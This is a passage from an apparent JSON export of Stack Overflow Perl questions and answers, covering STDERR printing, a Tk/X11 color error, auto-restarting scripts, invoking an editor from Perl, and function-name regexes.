NLQRVKQKLEKEKSEMKMEIDDLASNMETVSKAKGNLEKMCRALEDQLSEIKTKEEEQQRLINDLTAQ\nRARLQTESGEYSRQLDEKDTLVSQLSRGKQAFTQQIEELKRQLEEEIKAKSALAHALQSSRHDCDLLREQYEEEQEAKAE\n</code></pre>\n\n<p>Out of this, I would like to create a new file \"newmyosin.fasta\" which will pull out the organism name within the brackets in the header for this sample (e.g. <code>[Homo sapiens]</code>. The Perl code is used to read in from the myosin.fasta file with multiple samples as above, pick out the name within the bracket <code>[]</code>, and write out to a new file (e.g. newmyosin.fasta).</p>\n\n<p>Thanks!</p>\n"}, {"tags": ["python", "bash", "perl", "fish"], "comments": [{"owner": {"reputation": 11, "user_id": 2914113, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d6bd8df028823c9f98ba76bf9b077efc?s=128&d=identicon&r=PG&f=1", "display_name": "Daxter304", "link": "https://stackoverflow.com/users/2914113/daxter304"}, "reply_to_user": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "edited": false, "score": 0, "creation_date": 1446955396, "post_id": 33588125, "comment_id": 54956946, "body": "I apologize, I was in a hurry and did not provide specific enough information... I&#39;m going to edit the question with much better information"}, {"owner": {"reputation": 44559, "user_id": 411022, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9905bf9a7b8d5a587c1bdff07ef2e801?s=128&d=identicon&r=PG", "display_name": "Ilmari Karonen", "link": "https://stackoverflow.com/users/411022/ilmari-karonen"}, "edited": false, "score": 0, "creation_date": 1446994571, "post_id": 33588125, "comment_id": 54965522, "body": "I suspect, based on the added information, that your original problem was the different behavior of <code>print</code> in Perl and Python when given a &quot;nonexistent&quot; value: in Perl, <code>print undef</code> will print nothing, whereas in Python, <code>print None</code> will, in fact, print the string <code>None</code>. Glad to see you found a work-around, though."}], "answers": [{"comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 1, "creation_date": 1446932770, "post_id": 33588146, "comment_id": 54952352, "body": "... possibly with triple quotes for multiline text."}], "tags": [], "owner": {"reputation": 118519, "user_id": 244297, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/0e726125e86b084ffec695e845b360b7?s=128&d=identicon&r=PG", "display_name": "Eugene Yarmash", "link": "https://stackoverflow.com/users/244297/eugene-yarmash"}, "is_accepted": false, "score": 4, "last_activity_date": 1446932889, "last_edit_date": 1446932889, "creation_date": 1446932708, "answer_id": 33588146, "question_id": 33588125, "link": "https://stackoverflow.com/questions/33588125/what-is-the-equivalent-of-perls-print-stderr-in-python/33588146#33588146", "title": "What is the equivalent of Perl&#39;s &#39;print STDERR&#39; in Python?", "body": "<p>In Python 2 you can do:</p>\n\n<pre><code>print &gt;&gt; sys.stderr, \"\"\"Text to print\"\"\"\n</code></pre>\n\n<p>For Python 3 the syntax is:</p>\n\n<pre><code>print(\"\"\"Text to print\"\"\", file=sys.stderr)\n</code></pre>\n\n<p>Of course <code>import sys</code> is required in both cases to import the <code>sys</code> module.</p>\n"}, {"comments": [{"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 1, "creation_date": 1446954941, "post_id": 33588160, "comment_id": 54956870, "body": "Hi dvdt, welcome to Stack Overflow. If you ever find a question that can be answered by copy-pasting another Stack Overflow answer verbatim, please flag the question as a duplicate by clicking the &quot;flag&quot; button beneath the question. Marking questions as duplicates makes it easier for users to find them when searching."}], "tags": [], "owner": {"reputation": 378, "user_id": 5531628, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/jww4d.jpg?s=128&g=1", "display_name": "dunck", "link": "https://stackoverflow.com/users/5531628/dunck"}, "is_accepted": false, "score": 0, "last_activity_date": 1446932773, "last_edit_date": 1495542591, "creation_date": 1446932773, "answer_id": 33588160, "question_id": 33588125, "link": "https://stackoverflow.com/questions/33588125/what-is-the-equivalent-of-perls-print-stderr-in-python/33588160#33588160", "title": "What is the equivalent of Perl&#39;s &#39;print STDERR&#39; in Python?", "body": "<p>This was answered <a href=\"https://stackoverflow.com/a/14981125/5531628\">here</a></p>\n\n<blockquote>\n  <p>I found this to be the only one short + flexible + portable + readable:</p>\n  \n  <p><code>from __future__ import print_function</code>\n  ...</p>\n  \n  <p><code>def warning(*objs):\n      print(\"WARNING: \", *objs, file=sys.stderr)</code></p>\n</blockquote>\n"}], "owner": {"reputation": 11, "user_id": 2914113, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d6bd8df028823c9f98ba76bf9b077efc?s=128&d=identicon&r=PG&f=1", "display_name": "Daxter304", "link": "https://stackoverflow.com/users/2914113/daxter304"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 325, "favorite_count": 0, "closed_date": 1446985767, "answer_count": 2, "score": 0, "last_activity_date": 1446955737, "creation_date": 1446932558, "last_edit_date": 1446955737, "question_id": 33588125, "link": "https://stackoverflow.com/questions/33588125/what-is-the-equivalent-of-perls-print-stderr-in-python", "closed_reason": "Duplicate", "title": "What is the equivalent of Perl&#39;s &#39;print STDERR&#39; in Python?", "body": "<p>I am trying to rewrite a Perl script a coworker made that you lets you bookmark directories.</p>\n\n<p>The way it works is you type <code>go add dir</code> while in a folder and from anywhere else in terminal you type <code>go dir</code> and you will go to the bookmarked directory.</p>\n\n<p>From what I can tell go is a bash function that calls the perl script with the following code: <code>cd (godir)</code>.  It seems that to print out anything other than a dir it prints STDERR.  When I use sys.stderr.write() in python it prints out the text but it also prints out <code>cd: The directory 'None' does not exist</code></p>\n\n<p>This is an edit because my original question wasn't specific enough.\nI actually found a solution:\nMy fish function will eval whatever the Python script returns</p>\n\n<pre><code>eval (python go.py $argv)\n</code></pre>\n"}, {"tags": ["linux", "perl", "hash", "x11", "tk"], "comments": [{"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1446918300, "post_id": 33585570, "comment_id": 54947718, "body": "Could you provide a link to this online tutorial? Also what version of the Tk Perl module do you have?"}, {"owner": {"reputation": 7801, "user_id": 1212401, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/ed478436fcb05fd3ae15da650d2a8cd6?s=128&d=identicon&r=PG", "display_name": "Chris Doyle", "link": "https://stackoverflow.com/users/1212401/chris-doyle"}, "edited": false, "score": 1, "creation_date": 1446918457, "post_id": 33585570, "comment_id": 54947783, "body": "Not that it solves your prolem but i can confirm that your code works on my installation of perl so from a syntax point of view what you have is ok."}, {"owner": {"reputation": 61610, "user_id": 725418, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/82ac2dc3e1ad4b7187f245c416528df9?s=128&d=identicon&r=PG", "display_name": "TLP", "link": "https://stackoverflow.com/users/725418/tlp"}, "edited": false, "score": 0, "creation_date": 1446922657, "post_id": 33585570, "comment_id": 54949122, "body": "The error message &quot;is not a hash&quot; is a non-standard error message, coming from the Tk module. If you google that, you will notice other people having the same problem. The message itself comes from some XS file <a href=\"https://metacpan.org/source/SREZIC/Tk-804.033/tkGlue.c#L1\" rel=\"nofollow noreferrer\">metacpan.org/source/SREZIC/Tk-804.033/tkGlue.c#L1</a> which I cannot say more about because I do not know that language. Though it seems clear that this is probably an issue with your installation and not Perl."}, {"owner": {"reputation": 115, "user_id": 4541405, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/6c209cd112b711cb948298038e0e5cb8?s=128&d=identicon&r=PG&f=1", "display_name": "rhg_lnx", "link": "https://stackoverflow.com/users/4541405/rhg-lnx"}, "edited": false, "score": 0, "creation_date": 1446942176, "post_id": 33585570, "comment_id": 54954781, "body": "The tutorial site is <a href=\"http://www.perlmonks.org/?node_id=922840\" rel=\"nofollow noreferrer\">perlmonks.org/?node_id=922840</a> The versions are (per yum) Package perl-Tk-804.030-6.el7.x86_64 already installed and latest version Package 1:tk-8.5.13-4.el7.x86_64 already installed and latest version"}, {"owner": {"reputation": 927, "user_id": 5403907, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/F3lnS.jpg?s=128&g=1", "display_name": "mbethke", "link": "https://stackoverflow.com/users/5403907/mbethke"}, "edited": false, "score": 0, "creation_date": 1500699145, "post_id": 33585570, "comment_id": 77466332, "body": "Not sure it&#39;s still relevant but I had the same problem a while ago. It seems to have to do with X11 color values being undefined, and can be fixed by running <code>xrdb</code>, e.g. <code>xrdb merge ~&#47;.Xresources</code> with one of the files from <a href=\"https://github.com/solarized/xresources\" rel=\"nofollow noreferrer\">the Solarized project</a>. No idea what the underlying problem is though."}], "answers": [{"tags": [], "owner": {"reputation": 61, "user_id": 3337863, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/54117d9104f56fecda95add402cb15e6?s=128&d=identicon&r=PG&f=1", "display_name": "LittleWhite", "link": "https://stackoverflow.com/users/3337863/littlewhite"}, "is_accepted": false, "score": 1, "last_activity_date": 1568996568, "creation_date": 1568996568, "answer_id": 58032048, "question_id": 33585570, "link": "https://stackoverflow.com/questions/33585570/error-1132148-is-not-a-hash-when-running-perl-program-in-linux-using-tk/58032048#58032048", "title": "Error &quot;1132148 is not a hash&quot; when running Perl program in Linux using Tk", "body": "<p>The comment from mbethke leads to what is the real problem with this specific error.\nIn fact, on Linux, you can quickly check if Tk is properly working or not by using the <code>wish</code> command (that should open a small window).</p>\n\n<p>When you have the problem, wish does not open and outputs the following</p>\n\n<pre><code>unknown color name 'BACKGROUND'\n</code></pre>\n\n<p>And since wish and this error are more common than some Perl &amp; Tk scripts, you can find more answers, such <a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=1043686\" rel=\"nofollow noreferrer\">this one</a>, in which one you find a way to clear the color defined :</p>\n\n<pre><code>xrdb -load /dev/null\nxrdb -query\n</code></pre>\n\n<p>(<code>xrdb -query</code> is used to check the current color configuration.)</p>\n\n<p>Then, everything should be fixed.</p>\n"}], "owner": {"reputation": 115, "user_id": 4541405, "user_type": "registered", "accept_rate": 29, "profile_image": "https://www.gravatar.com/avatar/6c209cd112b711cb948298038e0e5cb8?s=128&d=identicon&r=PG&f=1", "display_name": "rhg_lnx", "link": "https://stackoverflow.com/users/4541405/rhg-lnx"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1568996568, "creation_date": 1446916965, "question_id": 33585570, "link": "https://stackoverflow.com/questions/33585570/error-1132148-is-not-a-hash-when-running-perl-program-in-linux-using-tk", "title": "Error &quot;1132148 is not a hash&quot; when running Perl program in Linux using Tk", "body": "<p>I'm running Centos 7, Perl 5 and X11.  In running a first time perl program copied from an online tutorial -</p>\n\n<pre><code>#!/usr/bin/perl\nuse strict;\nuse Tk;\nmy $mw = new MainWindow;\nmy $label = $mw -&gt; Label(-text=&gt;\"Hello World\") -&gt; pack();\nmy $button = $mw -&gt; Button(-text =&gt; \"Quit\", \n    -command =&gt; sub { exit })\n-&gt; pack();\nMainLoop;\n</code></pre>\n\n<p>And then invoking from the command line - </p>\n\n<pre><code>./test.pl\n</code></pre>\n\n<p>I receive the following error -</p>\n\n<pre><code>[foo@localhost Desktop]$ ./test.pl \n1132148 is not a hash at /usr/lib64/perl5/vendor_perl/Tk/MainWindow.pm  line 53.\nAborted (core dumped)\n</code></pre>\n\n<p>After commenting out lines it seems the error is generated by the \"my $mw = \" line</p>\n\n<p>Googling the error message I'm finding references indicating it might be an X11 known issue but not sure.  Also not sure where to begin looking for an answer.</p>\n\n<p>I have (using yum) double checked to make sure tk, perl-tk and tcl are up to date.  I've attempted to check the status of the X installation but am a little fearful of reinstalling lest I make things worse.</p>\n"}, {"tags": ["macos", "perl"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1446916903, "post_id": 33584540, "comment_id": 54947273, "body": "Is <a href=\"http://metacpan.org/module/File::Monitor\" rel=\"nofollow noreferrer\">File::Monitor</a> the sort of thing you&#39;re looking for?"}, {"owner": {"reputation": 254, "user_id": 2726696, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b0810c79f31289f7e8437d329eb46546?s=128&d=identicon&r=PG&f=1", "display_name": "Buxmaniak", "link": "https://stackoverflow.com/users/2726696/buxmaniak"}, "edited": false, "score": 0, "creation_date": 1446933427, "post_id": 33584540, "comment_id": 54952535, "body": "It depends very stong on which operating system you are using."}, {"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "edited": false, "score": 0, "creation_date": 1446960323, "post_id": 33584540, "comment_id": 54957692, "body": "As I understand it, you want to restart the program when the program itself changes?"}], "answers": [{"tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 3, "last_activity_date": 1446961650, "creation_date": 1446961650, "answer_id": 33591142, "question_id": 33584540, "link": "https://stackoverflow.com/questions/33584540/tools-similar-to-nodemon-for-perl/33591142#33591142", "title": "Tools similar to nodemon, for perl", "body": "<p>I don't know of a tool like nodemon for Perl, unless there's one for generically restarting any program when it changes.  Here's one I knocked together.</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\nuse v5.10;\n\nuse File::Monitor;\nuse Child qw(child);\n\nsub start_program {\n    my $program = shift;\n\n    return child {\n        exec $^X, $program, @ARGV;\n    };\n}\n\nsub restart_program {\n    my($program, $child) = @_;\n\n    $child-&gt;kill(\"TERM\");\n\n    return start_program($program);\n}\n\nsub monitor_program {\n    my $program = shift;\n\n    my $monitor = File::Monitor-&gt;new;\n\n    my $child = start_program($program);\n\n    say \"PID: \".$child-&gt;pid;\n\n    $monitor-&gt;watch($program, sub {\n        $child = restart_program($program, $child);\n    });\n\n    while(1) {\n        sleep 1;\n        $monitor-&gt;scan;\n    }\n}\n\nmonitor_program(shift);\n</code></pre>\n\n<p>This could be made more efficient by replacing <a href=\"https://metacpan.org/pod/File::Monitor\" rel=\"nofollow\">File::Monitor</a> with something hooking into the OS X filesystem event service.</p>\n"}], "owner": {"reputation": 19241, "user_id": 614944, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/f92772ec8a16758d669026f736aa7f0f?s=128&d=identicon&r=PG", "display_name": "daisy", "link": "https://stackoverflow.com/users/614944/daisy"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 116, "favorite_count": 1, "answer_count": 1, "score": 4, "last_activity_date": 1446961650, "creation_date": 1446910997, "last_edit_date": 1446948801, "question_id": 33584540, "link": "https://stackoverflow.com/questions/33584540/tools-similar-to-nodemon-for-perl", "title": "Tools similar to nodemon, for perl", "body": "<p>Is there something like <code>nodemon</code>, that monitors file changes and restarts a perl script?</p>\n\n<p>My perl script is just a while loop.</p>\n\n<p>I tried to google for it, but results are either about <code>mod_perl</code> or irrelevant.</p>\n\n<p>Any ideas?</p>\n\n<p>I'm using Mac OS</p>\n"}, {"tags": ["perl", "user-input", "text-editor", "multiline"], "answers": [{"tags": [], "owner": {"reputation": 611, "user_id": 3714435, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e62c30ed03cdbecf6cc187f6a0948a89?s=128&d=identicon&r=PG&f=1", "display_name": "a1111exe", "link": "https://stackoverflow.com/users/3714435/a1111exe"}, "is_accepted": false, "score": 1, "last_activity_date": 1446912649, "last_edit_date": 1446912649, "creation_date": 1446910968, "answer_id": 33584536, "question_id": 33584385, "link": "https://stackoverflow.com/questions/33584385/perl-redirect-multi-line-text-to-editor-and-return-edited-text-into-variable/33584536#33584536", "title": "Perl: redirect multi line text to editor and return edited text into variable", "body": "<p>Ok, I have suddenly found the way to do this. There is a 'vipe' tool in 'moreutils' package. So after <code>sudo apt-get install moreutils</code> (in my case the system is Ubuntu) the code should become:</p>\n\n<pre><code>my $result = `echo -n $txt | vipe`;\nprint $file_handle $result;\n</code></pre>\n\n<p>In my case the default editor is Vim (in my system vipe uses editor from 'EDITOR' environment variable, with rollback to vi if 'EDITOR' is undefined), so the text is opened in Vim under temporary file in '/tmp' - after <code>:wq</code> Vim command the editor is closed, the temporary file is deleted and the contents return to '$result' variable. Great!</p>\n"}, {"comments": [{"owner": {"reputation": 611, "user_id": 3714435, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e62c30ed03cdbecf6cc187f6a0948a89?s=128&d=identicon&r=PG&f=1", "display_name": "a1111exe", "link": "https://stackoverflow.com/users/3714435/a1111exe"}, "edited": false, "score": 0, "creation_date": 1446912372, "post_id": 33584650, "comment_id": 54945741, "body": "Thanks, it seems worth giving a try. Regarding vipe though, looking at <code>man vipe</code> makes me think that it uses &#39;EDITOR&#39; env. Also, I&#39;ve just checked it: after setting &#39;EDITOR&#39; to &#39;nano&#39; vipe uses nano editor instead of vi - at least on my system."}, {"owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "reply_to_user": {"reputation": 611, "user_id": 3714435, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e62c30ed03cdbecf6cc187f6a0948a89?s=128&d=identicon&r=PG&f=1", "display_name": "a1111exe", "link": "https://stackoverflow.com/users/3714435/a1111exe"}, "edited": false, "score": 1, "creation_date": 1446912951, "post_id": 33584650, "comment_id": 54945942, "body": "That&#39;s a nice observation. I&#39;m glad that vipe is doing the right thing.  It&#39;s too bad that <code>moreutils</code> isn&#39;t on CPAN; you just have to get it from your Linux distribution&#39;s package manager, if it&#39;s offered.  Looking at the source for <code>vipe</code>, I see that it also respects <code>$VISUAL</code> if set, which is a good thing."}], "tags": [], "owner": {"reputation": 13399, "user_id": 716443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a8d13509991dbbd5467f01f55988ae4e?s=128&d=identicon&r=PG", "display_name": "DavidO", "link": "https://stackoverflow.com/users/716443/davido"}, "is_accepted": true, "score": 1, "last_activity_date": 1446913045, "last_edit_date": 1446913045, "creation_date": 1446911701, "answer_id": 33584650, "question_id": 33584385, "link": "https://stackoverflow.com/questions/33584385/perl-redirect-multi-line-text-to-editor-and-return-edited-text-into-variable/33584650#33584650", "title": "Perl: redirect multi line text to editor and return edited text into variable", "body": "<p>It looks to me like <a href=\"http://search.cpan.org/~jmates/Term-CallEditor-0.66/lib/Term/CallEditor.pm\" rel=\"nofollow\">Term::CallEditor</a> is probably a good approach.  <code>vipe</code> is available from the <code>moreutils</code> package that can be installed using a package manager, but it is not on CPAN.  Term::CallEditor is available on CPAN, and has also probably been picked up by many package management repos.</p>\n\n<p><code>vipe</code> from <code>moreutils</code> invokes vi. Term::CallEditor's <code>solicit</code> command invokes the editor pointed to by the <code>EDITOR</code> environment variable, which is a more *nix-y way to do things; it's what people generally expect.  In the absence of an <code>EDITOR</code> environment variable it will fall back to <code>vi</code>.</p>\n\n<p>From the <code>SYNOPSIS</code> in Term::CallEditor's POD.</p>\n\n<pre><code>   use Term::CallEditor qw/solicit/;\n\n   my $fh = solicit('FOO: please replace this text');\n   die \"$Term::CallEditor::errstr\\n\" unless $fh;\n\n   print while &lt;$fh&gt;;\n</code></pre>\n\n<p>I like that <code>solicit</code> respects the <code>$ENV{'EDITOR'}</code> variable, which is similar to how <code>git</code> works, for example.</p>\n\n<p>Looking at the code from Term::CallEditor, it's really not that substantial nor complex, but given the module exists I wouldn't see any reason to try to duplicate its handling of edge cases myself.</p>\n\n<p>If <code>vipe</code> respects <code>$EDITOR</code> too, then it would come down to an assessment of what other features each module provides, and a deeper code review.  Or just pick one and go with it.  I still may favor Term::CallEditor because it is on CPAN.</p>\n"}, {"tags": [], "owner": {"reputation": 564, "user_id": 158575, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/50c5f04c098fa8e109cbccc2d116a4d5?s=128&d=identicon&r=PG", "display_name": "Todd", "link": "https://stackoverflow.com/users/158575/todd"}, "is_accepted": false, "score": 0, "last_activity_date": 1560950495, "last_edit_date": 1560950495, "creation_date": 1560457384, "answer_id": 56588067, "question_id": 33584385, "link": "https://stackoverflow.com/questions/33584385/perl-redirect-multi-line-text-to-editor-and-return-edited-text-into-variable/56588067#56588067", "title": "Perl: redirect multi line text to editor and return edited text into variable", "body": "<p><a href=\"https://metacpan.org/pod/Proc::InvokeEditor\" rel=\"nofollow noreferrer\">Proc::InvokeEditor</a> is another module that does this quite well.</p>\n"}], "owner": {"reputation": 611, "user_id": 3714435, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/e62c30ed03cdbecf6cc187f6a0948a89?s=128&d=identicon&r=PG&f=1", "display_name": "a1111exe", "link": "https://stackoverflow.com/users/3714435/a1111exe"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 1, "accepted_answer_id": 33584650, "answer_count": 3, "score": 1, "last_activity_date": 1560950495, "creation_date": 1446909904, "last_edit_date": 1446910378, "question_id": 33584385, "link": "https://stackoverflow.com/questions/33584385/perl-redirect-multi-line-text-to-editor-and-return-edited-text-into-variable", "title": "Perl: redirect multi line text to editor and return edited text into variable", "body": "<p>Is there any way to print multi line text from variable to some editor, that on exit will return the edited text to the script?</p>\n\n<p>Like:</p>\n\n<pre><code>my $result = `echo -n $txt | some_editor`;\nprint $file_handle $result;\n</code></pre>\n"}, {"tags": ["regex", "perl"], "comments": [{"owner": {"reputation": 20984, "user_id": 2170192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/JsKlq.png?s=128&g=1", "display_name": "Alex Shesterov", "link": "https://stackoverflow.com/users/2170192/alex-shesterov"}, "edited": false, "score": 3, "creation_date": 1446898711, "post_id": 33582655, "comment_id": 54941509, "body": "please post the regex you have so far."}, {"owner": {"user_type": "does_not_exist", "display_name": "user5536675"}, "reply_to_user": {"reputation": 20984, "user_id": 2170192, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/JsKlq.png?s=128&g=1", "display_name": "Alex Shesterov", "link": "https://stackoverflow.com/users/2170192/alex-shesterov"}, "edited": false, "score": 0, "creation_date": 1446900939, "post_id": 33582655, "comment_id": 54942186, "body": "I dont really have a regex yet, only some non working &quot;drafts&quot;"}], "answers": [{"tags": [], "owner": {"reputation": 486, "user_id": 4115884, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/zbzXF.jpg?s=128&g=1", "display_name": "yoko", "link": "https://stackoverflow.com/users/4115884/yoko"}, "is_accepted": true, "score": -2, "last_activity_date": 1448469202, "last_edit_date": 1448469202, "creation_date": 1446900674, "answer_id": 33582969, "question_id": 33582655, "link": "https://stackoverflow.com/questions/33582655/capturing-a-function-name-with-perl/33582969#33582969", "title": "Capturing a Function Name with perl", "body": "<p>Try </p>\n\n<p><code>$FuncName =~ s/\\s*\\w*\\s*\\w+(&amp;|\\*|(&amp;\\*|\\*&amp;)?)?\\s+((\\*&amp;|&amp;\\*)|&amp;|\\*)?(\\w+)((\\*&amp;|&amp;\\*)?|&amp;|\\*)?\\s*/$5/;</code></p>\n\n<p>this should cut everything beside the name stored in <code>$FuncName</code>  </p>\n\n<pre><code> # virtual const *foo -&gt; foo \n\n # int foo&amp; -&gt; foo \n\n # public virtual*&amp; foo*&amp; -&gt; foo\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user5536675"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 92, "favorite_count": 0, "accepted_answer_id": 33582969, "answer_count": 1, "score": 0, "last_activity_date": 1448469202, "creation_date": 1446898576, "last_edit_date": 1446899390, "question_id": 33582655, "link": "https://stackoverflow.com/questions/33582655/capturing-a-function-name-with-perl", "title": "Capturing a Function Name with perl", "body": "<p>I want to create mocking files of some of my header. I want to do this with a Perl script, but I am failing at retrieving the function name.</p>\n\n<p>I need to find a regular expression which converts the whole function name like <code>public virtual Function</code> to <code>Function</code>, or <code>private Function*</code> to <code>Function</code>.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 2954, "user_id": 2905, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f0eb53c993d09b1135375938f9727c28?s=128&d=identicon&r=PG", "display_name": "asjo", "link": "https://stackoverflow.com/users/2905/asjo"}, "edited": false, "score": 2, "creation_date": 1446895814, "post_id": 33582103, "comment_id": 54940799, "body": "Perl does not have a REPL (<a href=\"https://en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop\" rel=\"nofollow noreferrer\">en.wikipedia.org/wiki/Read%E2%80%93eval%E2%80%93print_loop</a>) built in, and does not default to entering one. Unlike, say, Python and R, but like, say, Ruby. Perl startup time is quite ok: perl -E &#39;&#39; takes ~0.002s on my laptop."}], "answers": [{"tags": [], "owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": true, "score": 6, "last_activity_date": 1446904860, "last_edit_date": 1446904860, "creation_date": 1446895186, "answer_id": 33582142, "question_id": 33582103, "link": "https://stackoverflow.com/questions/33582103/perl-in-terminal-takes-long-time-to-load/33582142#33582142", "title": "Perl in terminal takes long time to load", "body": "<p>If you just type <code>perl</code> then it will expect to receive a script from STDIN.</p>\n\n<p>It isn't taking forever to load. It is waiting for you to type a Perl program.</p>\n\n<p>It generally isn't desirable to type directly into STDIN (since your code isn't saved and you have limited ability to correct mistakes).</p>\n\n<p>Write your program in a text file and then specify that file as the argument.</p>\n\n<pre><code>perl myScript.pl\n</code></pre>\n\n<p>or, having made sure you start the script with an appropriate shebang line (<code>#!/usr/bin/env perl</code>), and made it executable (<code>chmod +x myScript.pl</code>), execute it directly:</p>\n\n<pre><code>./myScript.pl\n</code></pre>\n\n<p>If you were looking for a Python-style REPL then you can <a href=\"https://www.linode.com/docs/applications/development/manage-cpan-modules-with-cpan-minus\" rel=\"nofollow noreferrer\">use CPAN</a> to install <a href=\"https://metacpan.org/pod/Devel::REPL\" rel=\"nofollow noreferrer\">Devel::REPL</a> and start it with:</p>\n\n<pre><code>re.pl\n</code></pre>\n\n<p><a href=\"https://i.stack.imgur.com/ol8Qn.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.stack.imgur.com/ol8Qn.png\" alt=\"re.pl in action\"></a></p>\n"}], "owner": {"reputation": 4905, "user_id": 4701887, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/e2f933a5923f4decadfb0775c23c4912?s=128&d=identicon&r=PG", "display_name": "MAPK", "link": "https://stackoverflow.com/users/4701887/mapk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 170, "favorite_count": 0, "accepted_answer_id": 33582142, "answer_count": 1, "score": 1, "last_activity_date": 1446904860, "creation_date": 1446895000, "question_id": 33582103, "link": "https://stackoverflow.com/questions/33582103/perl-in-terminal-takes-long-time-to-load", "title": "Perl in terminal takes long time to load", "body": "<p>I am new to <code>perl</code> and wanted to run it from Ubuntu terminal, so I just typed <code>perl</code>. It is taking forever to load it. What do I need to do? To make sure perl is installed I typed:</p>\n\n<pre><code> perl -v\n\nThis is perl 5, version 18, subversion 2 (v5.18.2) built for x86_64-linux-gnu-thread-multi\n(with 41 registered patches, see perl -V for more detail)\n\nCopyright 1987-2013, Larry Wall\n</code></pre>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 48798, "user_id": 223226, "user_type": "registered", "accept_rate": 93, "profile_image": "https://i.stack.imgur.com/iGqE4.png?s=128&g=1", "display_name": "mpapec", "link": "https://stackoverflow.com/users/223226/mpapec"}, "is_accepted": true, "score": 4, "last_activity_date": 1446886062, "creation_date": 1446886062, "answer_id": 33580894, "question_id": 33580881, "link": "https://stackoverflow.com/questions/33580881/read-user-input-while-also-providing-filenames-as-arguments/33580894#33580894", "title": "Read User Input while also providing filenames as arguments", "body": "<p>You can use 